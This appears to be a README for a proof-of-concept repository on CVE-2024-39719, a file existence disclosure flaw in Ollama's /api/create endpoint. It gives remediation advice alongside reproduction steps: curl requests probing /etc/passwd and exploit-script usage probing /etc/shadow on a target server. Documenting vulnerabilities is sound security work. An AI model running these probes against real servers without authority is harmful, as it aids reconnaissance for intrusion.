# Ollama File Existence Disclosure Vulnerability (CVE-2024-39719) Analysis

[中文](README_CN.md)

## Vulnerability Overview

CVE-2024-39719 is a file existence disclosure vulnerability affecting Ollama versions 0.3.14 and earlier. This vulnerability allows attackers to detect the existence of specific files on the server through an API endpoint, potentially leading to information leakage.

**Release Date**: October 31, 2024

## Vulnerability Details

### Root Cause

The vulnerability exists in the `/api/create` endpoint of Ollama. When an attacker calls the `CreateModel` API with a path parameter, the server returns different error messages based on whether the path exists or not. This behavior allows an attacker to determine if a specific file or directory exists on the server by analyzing the error messages.

The core issue is that when handling user input, the system directly exposes file system errors to the client instead of properly hiding path existence information.

### Affected Versions

This vulnerability affects all versions of Ollama up to and including 0.3.14.

### Impact

While a file existence disclosure vulnerability may initially appear less severe, it can:

1. Serve as a preliminary step in more complex attacks, helping attackers gather server information
2. Be used to detect the presence of critical configuration files, certificates, or sensitive data files
3. Aid attackers in conducting more targeted attacks
4. Lead to information leakage in specific environments, such as confirming the existence of particular users or system characteristics

## Vulnerability Reproduction

### Environment Setup

1. Create a vulnerable Ollama environment using the following Docker Compose file:

```yaml
services:
  ollama:
    image: ollama/ollama:0.3.14
    container_name: ollama
    volumes:
      - ollama:/root/.ollama
    ports:
      - "11434:11434"

volumes:
  ollama:
```

2. Start the service:
```bash
docker compose up -d
```

3. After the service starts, you can confirm that Ollama 0.3.14 is running by accessing `http://your-ip:11434/`.

### Reproduction Steps

#### 1. Testing Non-existent Files

Send a request using `curl` to attempt to access a non-existent file:

```bash
curl "http://your-ip:11434/api/create" -d '{"name": "file-leak-existence","path": "/tmp/non-existing"}'
```

Response:
```json
{"error":"error reading modelfile: open /tmp/non-existing: no such file or directory"}
```

#### 2. Testing Existing Files

Test for an existing file, such as `/etc/passwd`:

```bash
curl "http://your-ip:11434/api/create" -d '{"name": "file-leak-existence","path": "/etc/passwd"}'
```

Response:
```json
{"error":"no FROM line for the model was specified"}
```

By analyzing these different error messages, an attacker can determine whether a target path exists or not, gaining information about the server's file structure.
Note that the information returned by the server may vary depending on the version.

## Vulnerability Remediation

### Official Fix

Ollama has fixed this vulnerability in newer versions. The fixes include:

1. Standardizing error handling to avoid leaking file existence information
2. Implementing stricter validation and filtering of user-provided paths
3. Using more generic error messages that don't directly expose file system information

### Recommended Remediation Steps

1. **Upgrade Ollama**: The most effective solution is to upgrade to the latest version of Ollama.
2. **Access Control**: Restrict access to API endpoints, allowing only authorized users.
3. **Network Isolation**: When possible, deploy Ollama services in isolated networks to reduce external access.
4. **Monitoring**: Enhance monitoring of API calls, particularly focusing on detecting unusual access patterns to the `/api/create` endpoint.

## Usage of the Exploit Script

The provided Python script allows you to test if an Ollama server is vulnerable to CVE-2024-39719.

### Requirements
- Python 3.x
- Required packages: `requests`, `termcolor`

### Installation
```bash
pip install requests termcolor
```

### Usage
```bash
python CVE_2024_39719.py -u <ollama-server-url> [-f <file-to-check>]
```

### Options
- `-u, --url`: URL of the Ollama server (required)
- `-f, --file`: File to check for existence (defaults to "/etc/passwd")

### Examples
```bash
# Check if a server is vulnerable
python CVE_2024_39719.py -u http://your-ip:11434

# Check if a specific file exists
python CVE_2024_39719.py -u http://your-ip:11434 -f /etc/shadow
```

## References

- [CVE-2024-39719 in the National Vulnerability Database](https://nvd.nist.gov/)
- [Ollama GitHub Repository](https://github.com/ollama/ollama)
- [Ollama Security Advisories](https://github.com/ollama/ollama/security/advisories)

## Disclaimer

This script is provided for educational purposes and legitimate security testing only. Always ensure you have proper authorization before testing any system for vulnerabilities. Unauthorized testing may violate laws and regulations.